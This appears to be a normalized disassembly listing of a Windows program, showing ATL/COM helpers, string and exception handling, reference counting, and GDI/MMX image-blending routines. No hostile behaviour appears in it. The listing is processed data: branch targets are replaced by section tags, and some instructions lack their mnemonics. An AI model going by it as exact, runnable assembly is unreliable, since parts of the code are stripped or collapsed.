movq mmx1 mm3
punpcklbw mm3 mm4
punpckhbw mmx1 mm4
pmaddwd mm3 mmx0
pmaddwd mmx1 mmx0
pand mm5 mm7
packssdw mm3 mmx1
pmaddwd mm3 mm2
psrld mm3 0xb
pxor mm3 mm7
pslld mm3 0x18
por mm5 mm3
movq [ edx + ecx * 4 ] mm5
add ecx 0x2
jne r-xdata
emms
mov edx [ ecx ]
mov eax [ ebx + ecx ]
sub eax edx
mov edx eax
shr edx 0x10
movzx edx dl
movzx edi ah
mov [ ebp + 0x8 ] eax
add edx edi
movzx eax al
add edx eax
mov eax 0xaaaaaaab
mul edx
shr edx 0x1
not dl
mov [ ecx + 0x3 ] dl
add ecx 0x4
dec esi
jne r-xdata
pop ebx
sub_403790
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_4037f0
mov edx [ ecx + 0x28 ]
cmp edx 0xfefefefe
lea eax [ ecx + 0x28 ]
je r-xdata
push eax
mov eax [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x10 ]
push ecx
call [ Ordinal_ATL71_10@IAT ]
retn 0x8
mov eax 0x8000ffff
retn 0x8
sub_403a30
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_403a70
push ebx
push esi
mov esi [ esp + 0xc ]
test esi esi
mov ebx ecx
jne r-xdata
push edi
push esi
call [ lstrlenW@IAT ]
mov edi eax
inc edi
cmp edi 0x80
jle r-xdata
mov [ ebx ] esi
pop esi
pop ebx
retn 0x4
lea ecx [ edi + edi ]
mov edi [ ebx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
lea eax [ edi + edi ]
push eax
call [ malloc@IAT ]
add esp 0x4
test eax eax
mov [ ebx ] eax
jne r-xdata
push 0x8007000e
call sub_401d20
sub_403ad0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_403b10
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_403ba0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
sete al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_403d30
push 0xffffffff
push sub_42f338
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403d70
mov edx [ r--data ]
mov eax ecx
lea ecx [ eax + 0x4 ]
mov [ ecx ] edx
mov edx [ r--data ]
mov [ ecx + 0x4 ] edx
mov edx [ r--data ]
mov [ ecx + 0x8 ] edx
mov edx [ r--data ]
mov [ ecx + 0xc ] edx
mov edx [ r--data ]
lea ecx [ eax + 0x14 ]
mov [ ecx ] edx
mov edx [ r--data ]
mov [ ecx + 0x4 ] edx
mov edx [ r--data ]
mov [ ecx + 0x8 ] edx
mov edx [ r--data ]
mov [ ecx + 0xc ] edx
xor ecx ecx
mov [ eax + 0x24 ] cx
mov [ eax + 0x26 ] cx
mov [ eax + 0x28 ] 0xfefefefe
retn
sub_403eb0
push 0xffffffff
push sub_42f365
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call [ exception::exception@IAT ]
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x18 ]
push eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_403f10
push 0xffffffff
push sub_42f385
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ exception::~exception@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403fa0
push 0xffffffff
push sub_42f398
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_403eb0
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404020
push 0xffffffff
push sub_42f3b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
call sub_403f10
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4040a0
push 0xffffffff
push sub_42f3f3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x34 ]
push esi
push eax
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x2c ] 0x1
mov ecx [ esp + 0x3c ]
push ecx
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
mov esi [ esp + 0x34 ]
push eax
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x2c ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x24 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn
sub_404120
push 0xffffffff
push sub_42f40b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
push 0xc
mov edi ecx
call sub_42e3bc
mov esi eax
add esp 0x4
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ esp + 0x1c ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_42cc10
mov [ esi ] eax
jmp r-xdata
mov ecx [ esp + 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push 0x8007000e
call sub_42cee0
mov [ esp + 0x14 ] 0xffffffff
test esi esi
mov [ edi ] esi
jne r-xdata
sub_4041b0
push 0xffffffff
push sub_42f42b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push 0xc
mov ebx ecx
call sub_42e3bc
mov esi eax
add esp 0x4
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov edi [ esp + 0x20 ]
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
mov ecx [ esp + 0xc ]
pop esi
mov eax ebx
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push 0x8007000e
call sub_42cee0
pop edi
jmp r-xdata
test edi edi
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
test esi esi
mov [ ebx ] esi
jne r-xdata
push 0x8007000e
call sub_42cee0
sub_404250
push 0xffffffff
push sub_42f44b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push 0xc
mov esi ecx
call sub_42e3bc
add esp 0x4
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
mov ecx eax
call sub_4030c0
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
push 0x8007000e
call sub_42cee0
mov [ esp + 0x10 ] 0xffffffff
test eax eax
mov [ esi ] eax
jne r-xdata
sub_4042f0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call [ SysFreeString@IAT ]
pop esi
retn
push esi
call ??_V@YAXPAX@Z
add esp 0x4
sub_404330
push ebp
mov ebp esp
sub esp 0x28
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0xc ]
mov eax 0x2ab02ab
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x4 ]
cmp eax edx
mov [ ebp - 0x20 ] 0x10001
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] edx
jg r-xdata
mov eax [ ebp - 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
push esi
sub ebx [ ecx ]
push edi
mov edi [ ecx + 0x4 ]
mov [ ebp - 0x8 ] ebx
and ebx 0xfffffffe
cmp edi eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edi
jge r-xdata
mov [ ebp - 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
lea ebx [ ebx ]
mov eax [ ebp - 0x8 ]
cmp ebx eax
jge r-xdata
mov ecx [ ebp - 0xc ]
pcmpeqb mm6 mm6
pxor mm4 mm4
mov eax [ ebp - 0x18 ]
movq mm7 mm6
movq mm2 [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
psrlw mm6 0xf
psrld mm7 0x8
lea eax [ eax + ecx * 4 ]
movq mmx0 [ ebp - 0x20 ]
lea edx [ edx + ecx * 4 ]
neg ecx
mov eax [ ebp - 0x4 ]
inc edi
cmp edi eax
mov [ ebp - 0x10 ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
lea ecx [ esi + ebx * 4 ]
sub edi esi
mov esi eax
sub esi ebx
lea ecx [ ecx ]
movq mm3 [ eax + ecx * 4 ]
movq mm5 [ edx + ecx * 4 ]
psubusb mm3 mm5
movq mmx1 mm3
punpcklbw mm3 mm4
punpckhbw mmx1 mm4
pmaddwd mm3 mmx0
pmaddwd mmx1 mmx0
pand mm5 mm7
packssdw mm3 mmx1
pmaddwd mm3 mm2
psrld mm3 0xb
pxor mm3 mm7
pslld mm3 0x18
por mm5 mm3
movq [ edx + ecx * 4 ] mm5
add ecx 0x2
jne r-xdata
emms
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov edx [ ecx ]
imul eax edi
add eax edx
shl eax 0x2
lea edx [ eax + esi ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0xc ]
add eax edx
test ebx ebx
mov [ ebp - 0x18 ] eax
jle r-xdata
mov edx [ ecx ]
mov eax [ edi + ecx ]
sub eax edx
mov edx eax
shr edx 0x10
movzx edx dl
movzx ebx ah
mov [ ebp - 0x18 ] eax
add edx ebx
movzx eax al
add edx eax
mov eax 0xaaaaaaab
mul edx
shr edx 0x1
not dl
mov [ ecx + 0x3 ] dl
add ecx 0x4
dec esi
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp + 0x14 ]
sub_404490
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov esi ecx
lea eax [ esi + 0x26 ]
push eax
lea ecx [ esi + 0x24 ]
push ecx
lea edi [ esi + 0x14 ]
push edi
lea edx [ esi + 0x4 ]
push edx
push ebx
call [ Ordinal_ATL71_54@IAT ]
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0x28 ]
cmp ecx 0xfefefefe
lea eax [ esi + 0x28 ]
je r-xdata
push eax
push edi
push esi
push ebx
call [ Ordinal_ATL71_10@IAT ]
test eax eax
jl r-xdata
pop edi
pop esi
mov eax 0x8000ffff
pop ebx
retn 0x4
xor eax eax
sub_404590
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_404610
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_404670
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_4046f0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_404750
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov ecx [ esi ]
xor eax eax
test ecx ecx
setne al
pop esi
retn 0x4
push 0x80004003
call sub_42cee0
sub_404820
push 0xffffffff
push sub_42f471
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push r--data
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4c ] 0x0
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
call sub_403eb0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x1c ] r--data
mov [ esp + 0x4c ] 0x0
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call _CxxThrowException
sub_404880
push 0xffffffff
push sub_42f495
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call [ exception::exception@IAT ]
mov [ esp + 0x14 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404910
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_404950
mov eax [ esp + 0x4 ]
mov eax [ eax ]
test eax eax
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov eax esi
pop esi
retn 0x4
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_404970
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
mov [ esi ] eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov edx [ edi ]
push edi
call [ edx + 0x8 ]
sub_4049a0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
mov [ esi ] eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov edx [ edi ]
push edi
call [ edx + 0x8 ]
sub_4049d0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
mov [ esi ] eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov edx [ edi ]
push edi
call [ edx + 0x8 ]
sub_404a00
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test eax eax
mov [ esi ] eax
je r-xdata
test edi edi
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov edx [ edi ]
push edi
call [ edx + 0x8 ]
sub_404a50
push ebx
mov bl [ esp + 0x8 ]
test bl 0x2
push esi
mov esi ecx
je r-xdata
mov ecx esi
call sub_403d30
test bl 0x1
je r-xdata
mov eax [ esi - 0x4 ]
push edi
push sub_403d30
lea edi [ esi - 0x4 ]
push eax
push 0xc
push esi
call sub_42e834
test bl 0x1
je r-xdata
mov eax esi
pop esi
pop ebx
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
push edi
call ??_V@YAXPAX@Z
add esp 0x4
sub_404ad0
push 0xffffffff
push sub_42f4a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call sub_404880
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404b30
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call ??_V@YAXPAX@Z
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_404b70
sub esp 0x60
push ebp
mov ebp [ esp + 0x6c ]
mov eax [ ebp ]
push esi
mov esi ecx
cmp eax [ esi + 0x5c ]
jl r-xdata
pop esi
xor eax eax
pop ebp
add esp 0x60
retn 0x8
mov ecx [ ebp + 0x4 ]
cmp ecx [ esi + 0x60 ]
jl r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ esi + 0x68 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x64 ]
jg r-xdata
mov eax [ esi + 0x50 ]
push ebx
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp [ esi + 0x54 ] ebx
push edi
jne r-xdata
mov ecx [ esp + 0x70 ]
mov esi [ esi + 0x90 ]
push ebp
push ecx
push 0x1
push esi
call [ OleDraw@IAT ]
xor edx edx
test eax eax
setge dl
pop ebx
pop esi
pop ebp
mov eax edx
add esp 0x60
retn 0x8
mov edi [ esp + 0x74 ]
mov eax [ esi + 0x58 ]
cmp eax ebx
mov edi [ DeleteObject@IAT ]
je r-xdata
mov edx [ ebp + 0x4 ]
mov ebx [ ebp ]
push 0xcc0020
push ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ esi + 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
sub ecx edx
push ecx
sub eax ebx
push eax
push edx
push ebx
push edi
call [ BitBlt@IAT ]
pop edi
pop ebx
pop esi
mov eax 0x1
pop ebp
add esp 0x60
retn 0x8
mov edx [ esi + 0x60 ]
mov ecx [ esi + 0x68 ]
mov eax [ esi + 0x5c ]
sub ecx edx
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x6c ]
sub edx eax
imul ecx edx
shl ecx 0x2
mov edx ecx
shr ecx 0x2
xor eax eax
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi [ esi + 0x60 ]
mov edx [ esi + 0x5c ]
mov ecx [ esi + 0x68 ]
mov eax [ esi + 0x64 ]
sub ecx edi
mov edi [ esi + 0x7c ]
sub eax edx
imul ecx eax
shl ecx 0x2
mov edx ecx
shr ecx 0x2
or eax 0xffffffff
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
lea edi [ esi + 0x90 ]
mov ecx edi
call sub_4038b0
mov edx [ esi + 0x5c ]
mov ecx [ esi + 0x64 ]
sub ecx edx
mov edx [ esi + 0x68 ]
mov [ esp + 0x30 ] ecx
sub edx [ esi + 0x60 ]
mov ecx [ esi + 0x64 ]
mov [ esp + 0x34 ] edx
sub ecx [ esi + 0x5c ]
mov edx [ esi + 0x68 ]
push ebx
push ebx
mov [ esp + 0x48 ] ecx
sub edx [ esi + 0x60 ]
mov [ esp + 0x4c ] edx
lea edx [ esp + 0x30 ]
push edx
lea edx [ esp + 0x44 ]
push edx
mov edx [ esi + 0x54 ]
push edx
push ebx
push ebx
push ebx
push 0xffffffff
push 0x1
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x64 ] ebx
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
mov ecx edi
call sub_4038b0
mov edx [ esi + 0x5c ]
mov ecx [ esi + 0x64 ]
mov edi [ esi + 0x60 ]
sub ecx edx
mov edx [ esi + 0x68 ]
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ecx
mov ecx [ esi + 0x64 ]
sub edx edi
mov [ esp + 0x44 ] edx
sub ecx [ esi + 0x5c ]
mov edx [ esi + 0x68 ]
push ebx
push ebx
mov [ esp + 0x38 ] ecx
mov ecx edi
sub edx ecx
mov [ esp + 0x3c ] edx
lea edx [ esp + 0x40 ]
push edx
lea edx [ esp + 0x34 ]
push edx
mov edx [ esi + 0x74 ]
push edx
push ebx
push ebx
push ebx
push 0xffffffff
push 0x1
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
mov al [ rw-data ]
mov ecx [ esi + 0x7c ]
mov edx [ esi + 0x6c ]
cmp al bl
lea eax [ esp + 0x10 ]
push eax
push ecx
push edx
je r-xdata
mov eax [ esi + 0x74 ]
cmp eax ebx
je r-xdata
push eax
call edi
call sub_4034d0
call sub_403650
jmp r-xdata
mov eax [ esi + 0x78 ]
cmp eax ebx
je r-xdata
push eax
call [ DeleteDC@IAT ]
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov edi [ esp + 0x80 ]
add esp 0xc
mov edi [ esi + 0x68 ]
mov edx [ esi + 0x60 ]
mov ecx [ esi + 0x64 ]
xor eax eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov eax [ esi + 0x5c ]
sub edx edi
mov edi [ esp + 0x74 ]
sub ecx eax
push edi
mov [ esp + 0x4c ] 0x28
mov [ esp + 0x5a ] 0x20
mov [ esp + 0x5c ] ebx
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x50 ] ecx
mov [ esp + 0x54 ] edx
call [ CreateCompatibleDC@IAT ]
push ebx
push ebx
mov [ esi + 0x54 ] eax
lea eax [ esi + 0x6c ]
push eax
push ebx
lea ecx [ esp + 0x58 ]
push ecx
push edi
call [ CreateDIBSection@IAT ]
mov edx [ esi + 0x54 ]
push eax
push edx
mov [ esi + 0x58 ] eax
call [ SelectObject@IAT ]
push edi
call [ CreateCompatibleDC@IAT ]
push ebx
push ebx
mov [ esi + 0x74 ] eax
lea eax [ esi + 0x7c ]
push eax
push ebx
lea ecx [ esp + 0x58 ]
push ecx
push edi
call [ CreateDIBSection@IAT ]
mov edx [ esi + 0x74 ]
push eax
push edx
mov [ esi + 0x78 ] eax
call [ SelectObject@IAT ]
jmp r-xdata
push eax
call edi
mov ecx [ esi + 0x5c ]
mov eax [ esi + 0x64 ]
mov edx [ esi + 0x60 ]
sub eax ecx
mov ecx [ esi + 0x68 ]
sub ecx edx
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] eax
mov eax [ ebp ]
sub eax ecx
mov ecx [ ebp + 0x4 ]
sub ecx edx
cmp [ esi + 0x90 ] ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ecx
je r-xdata
sub_404e90
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_404ed0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_42f4cb
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov [ esi ] eax
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_404fa0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
cmp [ esi ] 0x0
je r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_4046f0
push eax
call [ InterlockedIncrement@IAT ]
sub_404fe0
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push 0x80004003
call sub_42cee0
mov eax esi
pop esi
retn 0x4
mov [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_405010
push esi
push edi
mov edi ecx
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test al 0x14
mov ecx [ esp + 0xc ]
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push edi
push r--data
push eax
mov eax [ esp + 0x1c ]
push eax
push ecx
call [ CoCreateInstance@IAT ]
mov esi eax
lea edx [ esp + 0x10 ]
push edx
push r--data
push eax
mov eax [ esp + 0x1c ]
push eax
push ecx
call [ CoCreateInstance@IAT ]
mov esi eax
test esi esi
jl r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
mov [ edi ] 0x0
mov edx [ esp + 0x10 ]
push edx
call [ OleRun@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push edi
push r--data
push eax
call [ ecx ]
